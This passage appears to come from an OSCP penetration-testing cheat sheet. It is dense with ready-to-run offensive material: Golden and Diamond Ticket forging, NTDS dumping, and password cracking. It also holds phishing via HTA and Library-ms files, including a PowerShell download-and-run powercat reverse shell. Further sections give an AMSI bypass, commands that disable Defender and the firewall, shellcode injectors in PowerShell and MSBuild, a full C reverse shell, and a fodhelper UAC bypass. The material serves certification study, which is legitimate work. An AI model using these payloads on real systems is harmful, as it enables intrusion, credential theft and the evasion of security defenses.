+# Note the trailing slash at the end of the shadow copy device name's path!
+mklink /D C:\users\Public\stuff SHADOWCOPYDEVNAME\
+```
+
+`Secretsdump` also supports the VSS method directly:
+
+```sh
+# perform VSS technique all in one go using secretsdump (-use-vss flag)
+impacket-secretsdump -use-vss -just-dc -outputfile ntds-dump DOMAIN/ADMINUSER:PASSWORD@DC_IP
+```
+
+
+### 5.4.3 Golden Ticket
+
+A Golden Ticket is a forged TGT that grants the user full Domain Admin rights across the entire domain. It requires having access to the `krbtgt` account's password hash, which means we've either compromised a Domain Admin account or the Domain Controller machine directly. The `krbtgt` account's hash is what the KDC uses for signing (encrypting) TGTs in the AS-REP. It's special because it's never changed automatically.
+
+Taking advantage of a Golden Ticket is a form of overpass-the-hash, using the `krbtgt` hash to forge a TGT directly instead of submitting an AS-REQ with a regular user's hash to get the DC to grant you a TGT.
+
+Before starting, make sure you have the `krbtgt` hash. You can get this many ways, including running `lsadump::lsa` in mimikatz on the DC, performing a dcsync attack, etc. Additionally, you must use an existing username (as of July 2022), and not a phony one.
+
+```powershell
+# extract the Domain SID from the user's SID
+# (remove the RID and keep the rest. RID is last set of numbers in SID)
+whoami /user
+
+# in mimikatz shell
+privilege::debug
+# remove all existing tickets, so they don't conflict with the one you're forging
+kerberos::purge
+# forge golden ticket, load into memory with /ptt
+# note use of '/krbtgt:' to pass NTHASH instead of '/rc4:' - difference b/w silver
+# use '/aes256:' for AES256 kerberos hash
+kerberos::golden /user:USER /domain:DOMAIN /sid:S-1-5-21-.... /krbtgt:NTHASH /ptt
+# start cmd shell with new ticket in its context
+misc::cmd cmd
+
+# alternatively, use Rubeus (/aes256: if desired)
+.\Rubeus.exe golden /ptt /rc4:HASH /user:USERNAME /ldap [outfile:FILENAME]
+# here's loading a saved ticket:
+.\Rubeus.exe ptt /ticket:ticket.kirbi
+
+# list tickets in memory, make sure its there
+klist
+
+# now use overpass-the-hash technique (full domain name required)
+.\PsExec.exe \\dc1 cmd.exe
+```
+
+You can forge a Golden Ticket on Kali:
+
+```sh
+# look up domain SID
+impacket-lookupsid DOMAIN/USER:PASSWORD@VICTIM
+
+# use -aesKey for AES256 hashes
+impacket-ticketer -nthash NTHASH -domain-sid S-1-5-21-.... -domain DOMAIN USERNAME
+export KRB5CCNAME=$(pwd)/USERNAME.ccache
+impacket-psexec -k -no-pass DOMAIN/USERNAME@VICTIM
+# be sure to use FQDNs. Pass -dc-ip and -target-ip if necessary to resolve FQDNs
+```
+
+Even better (more OPSEC savvy) is a *Diamond Ticket*, where you modify the fields of a legitimate TGT by decrypting it with the `krbtgt` hash, modify it as needed (e.g. add Domain Admin group membership) and re-encrypt it.
+
+```powershell
+# Get user RID
+whoami /user
+
+.\Rubeus.exe diamond /ptt /tgtdeleg /ticketuser:USERNAME /ticketuserid:USER_RID /groups:512 /krbkey:AES256_HASH
+# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
+# /ticketuser is the username of the principal to impersonate.
+# /ticketuserid is the domain RID of that principal.
+# /groups are the desired group RIDs (512 being Domain Admins).
+# /krbkey is the krbtgt AES256 hash. 
+```
+
+
+
+## Cracking Password Hashes
+
+``` shell 
+# good wordlist
+/usr/share/wordlists/fasttrack.txt
+/usr/share/wordlists/rockyou.txt
+
+# specify mangling rules with addition of:
+-r /usr/share/hashcat/rules/best64.rule
+# more extensive rule list:
+-r /usr/share/hashcat/rules/d3ad0ne.rule
+# Great one for rockyou.txt:
+-r /usr/share/hashcat/rules/rockyou-30000.rule
+
+```
+
+### Cracking
+
+```sh
+hashcat --help | grep -i "md5"
+
+#cracking shadow
+john hashes.txt
+# cracking /etc/shadow with sha512crypt hashes ("$6$...")
+hashcat -m1800 -a0 -w3 hashes.txt /usr/share/wordlists/rockyou.txt
+
+#ssh
+ssh2john id_rsa > ssh.hash
+john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt
+hashcat -m 22921 kiero.ssh.hash /usr/share/wordlists/rockyou.txt --force
+
+# convert to friendly format
+keepass2john Database.kdbx > keepass.hash
+# remove "Database:" from beginning
+vim keepass.hash
+
+# crack with rockyou + rules
+hashcat -m 13400 -a0 -w3 -O --force -r /usr/share/hashcat/rules/rockyou-30000.rule keepass.hash /usr/share/wordlists/rockyou.txt
+
+#open kdbx file in linux 
+keepassxc
+```
+
+### LSA hashes cracking
+
+Follow the guide below:
+https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials
+
+
+## Client-Side Attacks
+
+### HTA Files
+
+Windows Internet Explorer and Edge browsers support *HTML Applications* (`.hta` files) that can run arbitrary code using Windows scripting languages like VBScript encapsulated in HTML. Instead of being run in the security context of the browser (where access to system resources is limited), the browser automatically detects the `.hta` extension and executes it with the user's permissions via `mshta.exe` (after prompting the user if they want to run it).
+
+Send one of these files to a user (or a link to one), and if they execute it, you win.
+
+Here's the basic template (save as `derp.hta`):
+
+```html
+<html>
+<head>
+<script language="VBScript">
+
+  <!-- just opens cmd terminal -->
+  var c= 'cmd.exe'
+  new ActiveXObject('WScript.Shell').Run(c);
+
+</script>
+</head>
+<body>
+<script language="VBScript">
+<!-- close this HTA window now that script running -->
+self.close();
+</script>
+</body>
+</html>
+```
+
+You can use msfvenom to generate an HTA file that will give you a reverse shell. You can either use the generated file directly or replace the top script block with a msfvenom payload:
+
+```sh
+msfvenom -p windows/shell_reverse_tcp -f hta-psh -o derp.hta lport=443 lhost=tun0
+```
+
+
+### Windows Library Files
+
+
+First, start your WebDAV server:
+
+```sh
+# start the server with open access
+wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root webdav/
+```
+
+Open Visual Studio Code. In the menu bar, we'll click on _File_ > _New Text File_. We'll then save the empty file as **config.Library-ms** on the _offsec_ user's desktop with the following block:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://192.168.45.230</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+
+```
+
+Double click on config to verify it opens in file explorer. 
+
+Next, we'll create the shortcut file on WINPREP. For this, we'll right-click on the Desktop and select _New_ > _Shortcut_. A
+
+```powershell
+python3 -m http.server 8000
+
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.230:8000/powercat.ps1'); powercat -c 192.168.45.230 -p 4444 -e powershell"
+```
+
+THEN COPY THE SHORTCUT AND THE CONFIG FILE INTO THE CONFIG FOLDER IN FILE EXPLORER
+
+The complete command is shown in the following listing. Once entered, we have to provide the credentials of _john_:
+
+```shell
+swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.197.191 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
+Username: john
+Password: DPuBT9tGCBrTbR
+
+```
+
+### Office/libreoffice Macros
+
+For Libreoffice, use the python shell here:
+https://github.com/0bfxgh0st/MMG-LO
+
+
+Because VBA limits string literals to 255 characters, I wrote a two helper scripts that make it easier to insert a `powercat.ps1` reverse shell payload into the string.
+
+- [mkpowercat.py](tools/win/mkpowercat.py)
+- [vbsify.py](tools/win/vbsify.py)
+
+Example Usage:
+
+```sh
+# create powercat macro payload
+./mkpowercat.py | ./vbsify.py
+
+# put powercat in current directory
+cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+
+# host file on http server
+python3 -m http.server 80
+
+# catching reverse shell callback:
+nc -lvnp 443
+```
+
+Once you have your malicious VBA macro payload, insert it into the Office file of your choice (Word, Excel, PowerPoint, etc.), and send it to your victim in some way, like via an email attachment or file upload to a server.
+
+
+## Compiling exploits 
+
+```shell 
+gcc main.c -L/usr/lib -lssl -lcrypto -o main
+gcc -s poc.c -o ptrace_traceme_root
+use -m32 for 32 bit compilation
+```
+
+### Cross-Compiling Windows Binaries on Linux
+
+You can use `mingw` to cross-compile C files.
+
+```sh
+# make sure you link Winsock with `-lws2_32` when using winsock.h
+i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
+
+# you can test that windows EXE's run as expected by using 'wine':
+wine syncbreeze_exploit.exe
+```
+
+## 3.4 Metasploit
+
+The Metasploit framework is only allowed to be used on one box on the OSCP exam, but it has great tools to make exploitation and post-exploit interaction easier.
+
+Initializing Metasploit (first time running it):
+
+```sh
+# initialize the metasploit postgres database
+sudo msfdb init
+
+# enable postgres to start on boot
+sudo systemctl enable postgresql
+```
+
+After the database starts, you can use any of the following commands to manage the database:
+
+- `msfdb reinit` - Deletes and reinitializes the database.
+- `msfdb delete` - Deletes the database.
+- `msfdb start` - Starts the database.
+- `msfdb stop` - Stops the database.
+- `msfdb status` - Shows the database status.
+
+### 3.4.1 Interacting with Metasploit via `msfconsole`
+
+Detailed interaction reference:
+
+```sh
+
+# inside the msfconsole:
+
+# check the database status
+msf6> db_status
+# check what workspace you're using
+# workspaces help isolate data from different assessments/subnets
+# (the database saves everything)
+msf6> workspace
+# add a workspace
+msf6> workspace -a NAME
+# change workspaces
+msf6> workspace OTHERNAME
+# delete workspace
+msf6> workspace -d NAME
+
+# using data stored in the database:
+# run nmap scan and save results to msfdb workspace
+msf6> db_nmap <nmap-options>
+# list all discovered hosts in msfdb workspace
+msf6> hosts
+# NOTE: you an tag hosts and search by tags.
+# see: https://docs.rapid7.com/metasploit/tagging-hosts-in-msfconsole
+# list all discovered services
+msf6> services
+# list all discovered services for port 8000
+msf6> services -p 8000
+# check if metasploit automatically detected any vulnerabilities
+msf6> vulns
+# view any saved/discovered credentials from brute force scans
+msf6> creds
+
+# resume interaction on backgrounded session
+msf6> sessions -i SESS_ID
+sessions -k 1
+
+# clear all routes from table
+msf6> route flush
+
+
+#Route Management with Multi/manage/autoroute and SOCKS Proxy:
+- Use the "multi/manage/autoroute" auxiliary module: use multi/manage/autoroute
+- Use the "auxiliary/server/socks_proxy" auxiliary module: use auxiliary/server/socks_proxy
+- Set the server's host to 127.0.0.1 and version to 5: set SRVHOST 127.0.0.1 and set VERSION 5
+- Run the module with the option to run in the background: run -j
+
+```
+
+### 3.4.3 Meterpreter command basics
+
+One payload option is to use the Meterpreter agent. It drops you into a command shell that lets you do all sorts of fun stuff easily (port forwarding, key-logging, screen grabbing, etc.).
+
+```sh
+# view list of meterpreter commands
+meterpreter> help
+# get information about victim system
+meterpreter> sysinfo
+# get username
+meterpreter> getuid
+# drop into interactive bash/cmd.exe shell
+meterpreter> shell
+# to suspend the shell to background, use Ctrl+z
+# list backgrounded shells (called 'channels'):
+meterpreter> channel -l
+# interact with backgrounded channel (shell)
+meterpreter> channel -i NUM
+# download file from victim
+meterpreter> download /etc/passwd
+# upload file to victim
+meterpreter> upload /usr/bin/unix-privesc-check /tmp/
+# attempt to auto-privesc to SYSTEM (on Windows host)
+meterpreter> getsystem
+# migrate your process to the memory of another process
+meterpreter> ps # find another process running with same user as you
+meterpreter> migrate PID # move your process to the memory of another process
+# spawn a process hidden ('-H') from user (no window)
+meterpreter> execute -H -f iexplore.exe
+# use mimikatz functionality to grab credentials
+meterpreter> load kiwi
+meterpreter> creds_all
+# add local port forward rule via meterpreter
+meterpreter> portfwd add -l LPORT -p RPORT -r RHOST
+# send this meterpreter session to background (return to msf console)
+meterpreter> bg
+# shut down meterpreter agent
+meterpreter> exit
+
+#autopwn linux
+https://null-byte.wonderhowto.com/how-to/get-root-with-metasploits-local-exploit-suggester-0199463/
+
+#if stuck in shell
+upload reverse.sh
+chmod 777 reverse.sh
+excute -f ./reverse.sh
+```
+
+
+## Antivirus & Firewall Evasion
+
+### 4.3.2 Shellter
+
+You can use `shellter` to inject a malicious payload into a legitimate Windows 32-bit executable. Just run `shellter` in the terminal and follow the prompts. Recommend using `stealth` mode so it doesn't alert the user. The paid version of `shellter` supports 64-bit executables.
+
+To check that your exploit works:
+
+```sh
+# start listener for reverse shell
+sudo nc -lvnp 443
+
+# run shellter-injected binary with wine
+wine derp.exe
+```
+
+**NOTE:** I've had issues using the binaries under `/usr/share/windows-resources/binaries/`, so download something like PuTTY from the internet instead. Make sure you get the 32-bit version of whatever binary you grab.
+
+
+### 4.3.3 Windows Process Injection
+
+The general technique for injecting shellcode into another (running) process goes like this:
+
+1. ***OpenProcess*** - Get a HANDLE to a target process that you have permissions to access
+2. ***VirtualAllocEx*** - Allocate memory within the target process
+3. ***WriteProcessMemory*** - Copy your shellcode into the target process's memory
+4. ***CreateRemoteThread*** - Start execution of your shellcode in new thread running within target process
+
+These are the most common Windows APIs used to accomplish this, but there are [many other alternatives](https://malapi.io/).
+
+Here is a PowerShell implementation of a simple "process injector" that injects the shellcode into itself and runs it:
+
+```powershell
+$imports = '
+[DllImport("kernel32.dll")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+[DllImport("kernel32.dll")]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+[DllImport("msvcrt.dll")]
+public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
+
+$w = Add-Type -memberDefinition $imports -Name "derp" -namespace Win32Functions -passthru;
+
+# msfvenom -p windows/shell_reverse_tcp -f powershell -v s LPORT=443 LHOST=tun0
+[Byte[]];
+[Byte[]]$s = <SHELLCODE HERE>;
+
+$size = 0x1000;
+
+if ($s.Length -gt 0x1000) {$size = $s.Length};
+
+$x = $w::VirtualAlloc(0,$size,0x3000,0x40);
+
+for ($i=0;$i -le ($s.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $s[$i], 1)};
+
+$w::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
+```
+
+
+
+### 4.3.4 Windows AMSI Bypass
+
+This one-liner lets you get past Windows' Antimalware Scan Interface (AMSI), which
+will e.g. block malicious powershell scripts from running. If you get a warning
+saying something like "This script contains malicious content and has been blocked
+by your antivirus software", then run this command to disable that blocker.
+
+```powershell
+$a=[Ref].Assembly.GetTypes();foreach($b in $a){if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
+```
+
+Other bypasses available through nishang's [Invoke-AMSIBypass](https://github.com/samratashok/nishang/blob/master/Bypass/Invoke-AmsiBypass.ps1).
+
+
+
+### 4.3.5 Turn off Windows Firewall
+
+```powershell
+# must be done from administrator prompt
+# Disable Windows firewall on newer Windows:
+netsh advfirewall set allprofiles state off
+
+# Disable Windows firewall on older Windows:
+netsh firewall set opmode disable
+```
+
+
+
+### 4.3.6 Turn off Windows Defender
+
+```powershell
+# must be running powershell as Administrator
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# for completely removing Windows Defender (until next Windows update)
+Uninstall-WindowsFeature -Name Windows-Defender
+```
+
+Alternatively, you should be able to do it with services:
+
+```powershell
+sc config WinDefend start= disabled
+sc stop WinDefend
+
+# to restart Defender
+sc config WinDefend start= auto
+sc start WinDefend
+```
+
+
+### 4.3.7 Windows Encoding/Decoding with LOLBAS
+
+```powershell
+# base64 encode a file
+certutil -encode inputFileName encodedOutputFileName
+# base64 decode a file
+certutil -decode encodedInputFileName decodedOutputFileName
+# hex decode a file
+certutil --decodehex encoded_hexadecimal_InputFileName
+# MD5 checksum
+certutil -hashfile somefile.txt MD5
+```
+
+
+### 4.3.8 Execute Inline Tasks with MSBuild.exe
+
+MSBuild is built into Windows .NET framework, and it lets you execute arbitrary
+C#/.NET code inline. Modify the XML file below with your shellcode from
+msfvenom's "-f csharp" format (or build a payload with Empire's
+windows/launcher_xml stager, or write your own C# and host over SMB)
+
+To build:
+```powershell
+# locate MSBuild executables
+dir /b /s C:\msbuild.exe
+
+# execute 32-bit shellcode
+C:\Windows\Microsoft.NET\assembly\GAC_32\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe  payload.xml
+
+# execute 64-bit shellcode
+C:\Windows\Microsoft.NET\assembly\GAC_64\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe  payload.xml
+```
+
+Here's the payload.xml template to inject your shellcode into (if not building
+with Empire)
+
+```xml
+<!-- This is 32-bit. To make 64-bit, swap all UInt32's for UInt64, use 64-bit
+     shellcode, and build with 64-bit MSBuild.exe
+     Building Shellcode:
+     msfvenom -p windows/shell_reverse_tcp -f csharp lport=443 lhost=tun0 | tee shellcode.cs
+-->
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <!-- This inline task executes shellcode. -->
+  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
+  <!-- Save This File And Execute The Above Command -->
+  <!-- Author: Casey Smith, Twitter: @subTee -->
+  <!-- License: BSD 3-Clause -->
+  <Target Name="Hello">
+    <ClassExample />
+  </Target>
+  <UsingTask
+    TaskName="ClassExample"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <Task>
+
+      <Code Type="Class" Language="cs">
+      <!-- to host code remotely, instead use:
+      <Code Type="Class" Language="cs" Source="\\ATTACKER_IP\share\source.cs">
+      -->
+      <![CDATA[
+        using System;
+        using System.Runtime.InteropServices;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+        public class ClassExample :  Task, ITask
+        {
+          private static UInt32 MEM_COMMIT = 0x1000;
+          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+          [DllImport("kernel32")]
+            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
+            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+          [DllImport("kernel32")]
+            private static extern IntPtr CreateThread(
+            UInt32 lpThreadAttributes,
+            UInt32 dwStackSize,
+            UInt32 lpStartAddress,
+            IntPtr param,
+            UInt32 dwCreationFlags,
+            ref UInt32 lpThreadId
+            );
+          [DllImport("kernel32")]
+            private static extern UInt32 WaitForSingleObject(
+            IntPtr hHandle,
+            UInt32 dwMilliseconds
+            );
+          public override bool Execute()
+          {
+            //PUT YOUR SHELLCODE HERE;
+
+            UInt32 funcAddr = VirtualAlloc(0, (UInt32)buf.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+            Marshal.Copy(buf, 0, (IntPtr)(funcAddr), buf.Length);
+            IntPtr hThread = IntPtr.Zero;
+            UInt32 threadId = 0;
+            IntPtr pinfo = IntPtr.Zero;
+            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+            return true;
+          }
+        }
+      ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
+```
+
+
+
+### 4.3.9 Custom Windows TCP Reverse Shell
+
+A custom reverse shell can often get past antivirus.
+
+```c
+/* Win32 TCP reverse cmd.exe shell
+ * References:
+ * https://docs.microsoft.com/en-us/windows/win32/winsock/creating-a-basic-winsock-application
+ * https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup
+ * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa
+ * https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-sockaddr_in
+ * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-inet_addr
+ * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-htons
+ * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect
+ * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
+ * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
+ * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
+ * https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa366877(v=vs.85)
+ */
+#include <winsock2.h>
+#include <ws2tcpip.h>
+
+#pragma comment(lib, "Ws2_32.lib")
+
+// CHANGE THESE
+#define TARGET_IP   "LISTEN_IP"
+#define TARGET_PORT 443
+
+void main(void) {
+  SOCKET s;
+  WSADATA wsa;
+  STARTUPINFO si;
+  struct sockaddr_in sa;
+  PROCESS_INFORMATION pi;
+
+  WSAStartup(MAKEWORD(2,2), &wsa);
+  s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+  sa.sin_family = AF_INET;
+  sa.sin_addr.s_addr = inet_addr(TARGET_IP);
+  sa.sin_port = htons(TARGET_PORT);
+  WSAConnect(s, (struct sockaddr *)&sa, sizeof(sa), NULL, NULL, NULL, NULL);
+  SecureZeroMemory(&si, sizeof(si));
+  si.cb = sizeof(si);
+  si.dwFlags = STARTF_USESTDHANDLES;
+  si.hStdInput = (HANDLE)s;
+  si.hStdOutput = (HANDLE)s;
+  si.hStdError = (HANDLE)s;
+  CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+}
+```
+
+To compile on Kali (as 32-bit binary because it works on both 32- and 64-bit):
+
+```sh
+sudo dpkg --add-architecture i386
+sudo apt update
+sudo apt install mingw-w64 wine
+i686-w64-mingw32-gcc rsh.c -o rsh.exe -s -lws2_32
+```
+
+
+
+### 4.3.10 Windows UAC Bypass
+
+Only the local "Administrator" user can perform admin actions without any User Account Control (UAC) restrictions. All other admin user accounts must normally pass UAC checks to perform admin actions, unless UAC is disabled.
+
+UAC Enabled registry key (can only modify as admin):
+
+``` powershell
+# Disabling UAC via registry:
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t DWORD /f /d 0
+
+# Enabling UAC:
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t DWORD /f /d 1
+```
+
+Bypass Technique:
+
+```powershell
+# Ref: https://mobile.twitter.com/xxByte/status/1381978562643824644
+New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force
+New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
+fodhelper
+
+# To undo:
+Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+```
+
+
+
+
+
